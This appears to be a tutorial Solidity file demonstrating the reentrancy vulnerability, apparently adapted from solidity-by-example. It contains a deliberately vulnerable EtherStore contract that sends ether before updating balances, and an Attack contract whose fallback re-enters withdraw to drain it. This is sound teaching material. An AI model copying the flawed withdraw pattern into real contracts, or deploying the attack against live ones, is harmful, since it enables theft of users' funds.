// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

/*
Reentrancy
- What is reentrancy?
- Remix code and demo
- Preventative techniques

官网最新的example
  https://solidity-by-example.org/hacks/re-entrancy/
*/

contract EtherStore {
    mapping(address => uint) balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount);

        // https://docs.soliditylang.org/en/latest/types.html?highlight=transfer%20send#members-of-addresses
        // Solidity文档中关于call的用法
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] -= _amount;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) public {
        etherStore = EtherStore(_etherStoreAddress);
    }

    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        // 0.5
        // etherStore.deposit.value(1 ether)();
        // 0.6
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw(1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
